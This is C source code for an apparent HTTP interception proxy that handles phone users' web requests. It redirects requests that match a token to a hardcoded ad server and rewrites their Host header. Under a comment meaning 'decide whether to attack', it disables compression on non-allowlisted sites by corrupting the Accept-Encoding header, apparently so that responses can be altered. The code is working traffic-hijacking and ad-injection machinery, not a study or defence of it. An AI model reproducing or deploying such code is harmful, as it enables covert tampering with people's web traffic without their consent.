#include "includes.h"

#define HOST_LEN	1024
#define URI_LEN		4048
#define PORT_LEN	15

#define LY_TEST		0

#if LY_TEST
#define AD_HOST		"plugin.sz.zazaj.com"
#define AD_HOST_LEN	19
#define AD_PORT		"80"
#define AD_PORT_LEN	2
#else
#define AD_HOST		"121.196.215.235"
#define AD_HOST_LEN	15
#define AD_PORT		"80"
#define AD_PORT_LEN	2
#endif


#define CHECK_HOST(host, len) \
{ \
	if (fhconfig_cmp(host, len) == 0) \
	{ \
		return 0; \
	} \
}


#define PHONE_CHECK_STATE(phone, state, first...) \
{ \
	if (state == E_EAGIN) \
	{ \
		return 0; \
	} \
	if (state == E_ERROR) \
	{ \
		LOG_ERROR_INFO(first); \
		return -1; \
	}	\
}

int analysis_method(phoneinfo_t *phone)
{	
	if (! phone)
		return -1;

	socketstate_t state = E_ERROR;
	while (1)
	{
		char *buf = phone->swap_buf->buf + phone->swap_buf->datalen;
		int freesize = phone->swap_buf->bufsize - phone->swap_buf->datalen;
		if (freesize <= 0)
		{
			LOG_ERROR_INFO("freesize is <= 0! %d\n", freesize);
			return -1;
		}
		int ret = readline(phone->fd, buf, freesize-1, &state);
		if (ret <= 0)
		{
			PHONE_CHECK_STATE(phone, state, "analysis method failt, because read error!\n");
		}
		phone->swap_buf->datalen += ret;
		if (/*isStrnexit(phone->swap_buf->buf, phone->swap_buf->datalen, "\r\n", 2)
		||*/ isStrnexit(phone->swap_buf->buf, phone->swap_buf->datalen, "\n", 1))
		{
			//接收完毕一行，从中分析头
			if (calloc_buf(phone->request->method, 15) < 0)
			{
				LOG_ERROR_INFO("calloc buf error!\n");
				return -1;
			}
			phone->request->method->datalen = get_http_method(phone->swap_buf->buf, 
					phone->request->method->buf, phone->request->method->bufsize);
			if (phone->request->method->datalen <= 0)
			{
				LOG_ERROR_INFO("get_http_method error! [%s][len: %d].\n", phone->swap_buf->buf, phone->swap_buf->datalen);
				return -1;
			}

			//判断方法
			if (httpmethod_cmp(phone) < 0)
			{
				LOG_ERROR_INFO("unkown http method!\n");
				return -1;
			}
			phone->opt = E_READ_REQUEST;
			return 0;
		}
	}
	
	return 0;
}

int analysis_host_uri_port(phoneinfo_t *phone)
{
	if (! phone)
		return -1;

	int serverport = 80;
	if (calloc_buf(phone->request->host, HOST_LEN) < 0)
	{
		LOG_ERROR_INFO("calloc_buf error!\n");
		return -1;
	}
	phone->request->host->datalen = get_http_host(phone->swap_buf->buf, phone->swap_buf->datalen, 
			phone->request->host->buf, phone->request->host->bufsize, &serverport);
	if (phone->request->host->datalen <= 0)
	{
		LOG_ERROR_INFO("get http host error!\n");
		return -1;
	}
	if (calloc_buf(phone->request->port, PORT_LEN) < 0)
	{
		LOG_ERROR_INFO("calloc_buf error!\n");
		return -1;
	}
	sprintf(phone->request->port->buf, "%d", serverport);
	phone->request->port->datalen = strlen(phone->request->port->buf);

	if (calloc_buf(phone->request->uri, URI_LEN) < 0)
	{
		LOG_ERROR_INFO("calloc_buf error!\n");
		return -1;
	}	

	phone->request->uri->datalen = get_http_uri(phone->swap_buf->buf, phone->swap_buf->datalen, 
			phone->request->uri->buf, phone->request->uri->bufsize);
	if (phone->request->uri->datalen <= 0)
	{
		LOG_ERROR_INFO("get http uri error!\n");
		return -1;		
	}

	LOG_HL_INFO("URL: %s:%s%s\n", phone->request->host->buf, phone->request->port->buf, phone->request->uri->buf);
	return serverport;
}

int analysis_get(phoneinfo_t *phone)
{
	if (! phone)
		return -1;

	socketstate_t state = E_ERROR;	
	while (1)
	{
		char *buf = phone->swap_buf->buf + phone->swap_buf->datalen;
		int freesize = phone->swap_buf->bufsize - phone->swap_buf->datalen;
		if (freesize <= 0)
		{
			LOG_ERROR_INFO("freesize is <= 0! %d\n", freesize);
			return -1;
		}
		int ret = readline(phone->fd, buf, freesize-1, &state);
		if (ret <= 0)
		{
			PHONE_CHECK_STATE(phone, state, "analysis request failt, because read error!\n");
		}
		buf[ret] = 0;
		phone->swap_buf->datalen += ret;

		if (isStrnexit(phone->swap_buf->buf, phone->swap_buf->datalen, "\r\n\r\n", 4))
		{
			break;
		}
	}

	LOG_NORMAL_INFO("%s", phone->swap_buf->buf);

	int serverport = analysis_host_uri_port(phone);
	if (serverport <= 0)
	{
		LOG_ERROR_INFO("analysis port error! serverport = %d\n", serverport);
		return -1;
	}

	//内联转换 --> mod test 后面需要写成配置
	int adplugin = 0;
	char *token = URL_TOKEN;
	int offset = find_str(phone->request->uri->buf, phone->request->uri->datalen, token, URL_TOKEN_LEN);
	if (offset >= 0)
	{
		//printf("---> %s%s\n", host, file);
		
		sprintf(phone->request->host->buf, AD_HOST);
		phone->request->host->datalen = AD_HOST_LEN;
		sprintf(phone->request->port->buf, "%s", AD_PORT);
		phone->request->port->datalen = AD_PORT_LEN;
		serverport = atoi(phone->request->port->buf);
		
		adplugin = 1;
	}

#if _AUTH_ON_
	if (do_auth(phone->fd, phone->request->host->buf,
				phone->request->host->datalen, phone->request->uri->buf,
			phone->request->uri->datalen, phone->swap_buf->buf, phone->swap_buf->datalen) <= 0)
	{
		//未被认证
		return -1;
	}
#endif

	CHECK_HOST(phone->request->host->buf, phone->request->host->datalen);

	//链接服务器
	LOG_HL_INFO("connect to [ %s:%d ] begin...\n", phone->request->host->buf, serverport);
	int serverfd = connecthost(phone->request->host->buf, serverport, E_CONNECT_NOBLOCK);
	if (serverfd <= 0)
	{
		LOG_ERROR_INFO("can't connect to %s:%d !\n", phone->request->host->buf, serverport);
		return -1;
	}
	phone->serverfd = serverfd;
	LOG_NORMAL_INFO("connect to %s:%d success .\n", phone->request->host->buf, serverport);

	//判断是否需要攻击
	int isAccept = 1;
	if ((! adplugin) && (! isStrnexit(phone->request->host->buf, 
				phone->request->host->datalen, AD_HOST, AD_HOST_LEN))
		&& (! isStrnexit(phone->request->host->buf, 
				phone->request->host->datalen, AUTHEN_HOST, AUTHEN_HOST_LEN)))
	{
		isAccept = check_domain_accept(phone->request->host->buf, phone->request->host->datalen);
		if (! isAccept)
		{
			isAccept = check_uri_accept(phone->request->uri->buf, phone->request->uri->datalen);
		}
	}
	phone->swap_buf->buf[phone->swap_buf->datalen] = '\0';

	int ret = 0;
	char *header = phone->swap_buf->buf;
	char buf[MAXBUF+1];
	while (1)
	{
		ret = strline(header, buf);
		if (ret <= 0)
		{
			break;
		}
		header += ret;
		buf[ret] = 0;

		if (adplugin)
		{
			if (isStrnexit(buf, ret, "Host:", 5))
			{
				sprintf(buf, "Host: %s\r\n", phone->request->host->buf);
				ret = 8 + phone->request->host->datalen;
			}
		}
		
		if (! isAccept)
		{
			#if 0
			if (isStrnexit(buf, ret, "If-Modified-Since:", 18)
			|| isStrnexit(buf, ret, "If-None-Match:", 14))
			{
				continue;
			}
			#endif
			if (isStrnexit(buf, ret, "Accept-Encoding", 15)
			&& (! isStrnexit(phone->request->host->buf, phone->request->host->datalen, "video", 5)))
			{
				memcpy(buf, "Accept-Rubbish!", 15);
			}
		}
		
		if (socket_send(serverfd, buf, ret) != ret)
		{
			LOG_ERROR_INFO("send header to server error! ret = %d\n", ret);
			return -1;
		}
		PRINTF("%s", buf);
		if (strcmp(buf, "\r\n") == 0)
		{
			break;
		}
	}

	epoll_del_sockfd(phone->epoll_fd, phone->fd);

	//add 到 server epoll
	if (epoll_add_to_webserver(serverfd, phone, isAccept) < 0)
	{
		LOG_ERROR_INFO("epoll add serverfd to webserver error!\n");
		return -1;
	}

	//phone这边流程告一段落
	phone->opt = E_PHONE_FINISHED;
	return 0;
}

int read_post_header(phoneinfo_t *phone)
{
	if (! phone)
		return -1;

	socketstate_t state = E_ERROR;
	while (1)
	{
		char *buf = phone->swap_buf->buf + phone->swap_buf->datalen;
		int freesize = phone->swap_buf->bufsize - phone->swap_buf->datalen;
		if (freesize <= 0)
		{
			LOG_ERROR_INFO("freesize is <= 0! %d\n", freesize);
			return -1;
		}		
		int ret = readline(phone->fd, buf, freesize-1, &state);
		if (ret <= 0)
		{
			PHONE_CHECK_STATE(phone, state, "analysis request failt, because read error!\n");
		}
		buf[ret] = 0;
		phone->swap_buf->datalen += ret;

		if (isStrnexit(phone->swap_buf->buf, phone->swap_buf->datalen, "\r\n\r\n", 4))
		{
			phone->tmp = 0;
			ret = get_content_length(phone->swap_buf->buf, phone->swap_buf->datalen);
			if (ret > 0)
				phone->tmp = ret;
			
			break;
		}
	}
	LOG_HL_INFO("%s", phone->swap_buf->buf);
	//LOG_DC_INFO(COLOR_PURPLE, "=====>>> phone->tmp = %d \n%s", phone->tmp, phone->swap_buf->buf);

	int serverport = analysis_host_uri_port(phone);
	if (serverport <= 0)
	{
		LOG_ERROR_INFO("analysis port error! serverport = %d\n", serverport);
		return -1;
	}

#if _AUTH_ON_
	if (do_auth(phone->fd, phone->request->host->buf,
				phone->request->host->datalen, phone->request->uri->buf,
			phone->request->uri->datalen, phone->swap_buf->buf, phone->swap_buf->datalen) <= 0)
	{
		//未被认证
		return -1;
	}
#endif

	CHECK_HOST(phone->request->host->buf, phone->request->host->datalen);

	LOG_HL_INFO("connect to %s:%d begin...\n", phone->request->host->buf, serverport);
	int serverfd = connecthost(phone->request->host->buf, serverport, E_CONNECT_NOBLOCK);
	if (serverfd <= 0)
	{
		LOG_ERROR_INFO("can't connect to %s:%d !\n", phone->request->host->buf, serverport);
		return -1;
	}
	phone->serverfd = serverfd;
	LOG_NORMAL_INFO("connect to %s:%d success .\n", phone->request->host->buf, serverport);

	if (socket_send(serverfd, phone->swap_buf->buf, phone->swap_buf->datalen) != phone->swap_buf->datalen)
	{
		LOG_ERROR_INFO("send post request to server error!\n");
		return -1;
	}	

	phone->swap_buf->datalen = 0;
	phone->opt = E_READ_POST_CONTEXT;
	return 0;
}

int analysis_post(phoneinfo_t *phone)
{
	if (! phone)
		return -1;
	int read_len = 0;
	socketstate_t state = E_ERROR;
	while (phone->tmp > 0)
	{
		if (phone->tmp > (phone->swap_buf->bufsize - 1))
		{
			read_len = phone->swap_buf->bufsize - 1;
		}
		else
		{
			read_len = phone->tmp;
		}
		phone->swap_buf->datalen = socket_read(phone->fd, phone->swap_buf->buf, read_len, &state);
		if (phone->swap_buf->datalen <= 0)
		{
			PHONE_CHECK_STATE(phone, state, "read post content error!\n");
		}
		phone->swap_buf->buf[phone->swap_buf->datalen] = 0;
		phone->tmp -= phone->swap_buf->datalen;
		if (socket_send(phone->serverfd, phone->swap_buf->buf, phone->swap_buf->datalen) != phone->swap_buf->datalen)
		{
			LOG_ERROR_INFO("send post content to server error!\n");
			return -1;
		}
	}

	epoll_del_sockfd(phone->epoll_fd, phone->fd);

	if (epoll_add_to_webserver(phone->serverfd, phone, 1) < 0)
	{
		LOG_ERROR_INFO("epoll add serverfd to webserver error!\n");
		return -1;
	}
	
	phone->opt = E_PHONE_FINISHED;

	return 0;
}


int analysis_head(phoneinfo_t *phone)
{
	return analysis_get(phone);
}

int analysis_connect(phoneinfo_t *phone)
{
	return -1;
}

int analysis_request(phoneinfo_t *phone)
{	
	if (! phone)
		return -1;

	int ret = -1;
	switch (phone->method)
	{
		case E_GET:
		{
			ret = analysis_get(phone);
			break;
		}
		case E_HEAD:
		{
			ret = analysis_head(phone);
			break;
		}
		case E_POST:
		{
			ret = read_post_header(phone);
			if (phone->opt == E_READ_POST_CONTEXT)
				ret = analysis_post(phone);
			break;
		}
		case E_CONNECT:
		{
			//ret = analysis_connect(phone);
			break;
		}
		default :
		{
			break;
		}		
	}

	return ret;
}

int phone_data_process(struct epoll_event event)
{
	phoneinfo_t *phone = (phoneinfo_t *)event.data.ptr;
	if (! phone)
		return -1;

#if __SOCKET_MONITOR__
	activity_socket_monitor(phone);
#endif

	int ret = -1;
	switch (phone->opt)
	{
		case E_READ_METHOD:
		{
			ret = analysis_method(phone);
			if (phone->opt == E_READ_REQUEST)
				ret = analysis_request(phone);
			break;
		}
		case E_READ_REQUEST:
		{
			ret = analysis_request(phone);
			break;
		}
		case E_READ_POST_CONTEXT:
		{
			ret	= analysis_post(phone);
			break;
		}
		case E_PHONE_FINISHED:
		{
			epoll_del_sockfd(phone->epoll_fd, phone->fd);
			ret = 0;
			break;
		}
		default:
		{
			PRINTF(COLOR_RED "unkown phone option ! ret = %d\n" COLOR_NONE_C, ret);
			break;
		}
	}
	
	if (phone->opt == E_PHONE_FINISHED)
	{
		//不做操作
		epoll_del_sockfd(phone->epoll_fd, phone->fd);
	}
	else
	{
		if (ret < 0)
		{			
			socket_close(phone->serverfd);
			socket_close_client(phone->fd);
			epoll_del_sockfd(phone->epoll_fd, phone->fd);
			epoll_del_sockfd(phone->epoll_serverfd, phone->serverfd);
#if __SOCKET_MONITOR__
			free_webserver_member(phone->webserver);
			free_phoneinfo_member(phone);
#else
			free_webserver(phone->webserver);
			free_phoneinfo(phone);
#endif
		}
		else
		{
			epoll_mod_to_phone(phone);
		}
	}

	return 0;
}

void *phone_data_process_thread(void *arg)
{
	pthread_detach(pthread_self());
	
	phone_data_process(*((struct epoll_event *)arg));
	free (arg);
	arg = NULL;

	return NULL;
}

void *callback_phone_data_process(void *arg)
{
	phone_data_process(*((struct epoll_event *)arg));
	free (arg);
	arg = NULL;

	return NULL;
}

int create_phone_data_process_thread(struct epoll_event event)
{
	struct epoll_event *arg = calloc(1, sizeof(struct epoll_event));
	if (! arg)
	{
		LOG_PERROR_INFO("calloc error.");
		return -1;
	}
	memcpy(arg, &event, sizeof(struct epoll_event));
	if (tpool_add_work(callback_phone_data_process, arg) == -2)
	{
		pthread_t thip;
		if (pthread_create(&thip, NULL, phone_data_process_thread, arg) != 0)
		{
			LOG_PERROR_INFO("pthread create error.");
			
			if (arg)
				free (arg);
			arg = NULL;

			return -1;
		}
	}
	return 0;
}
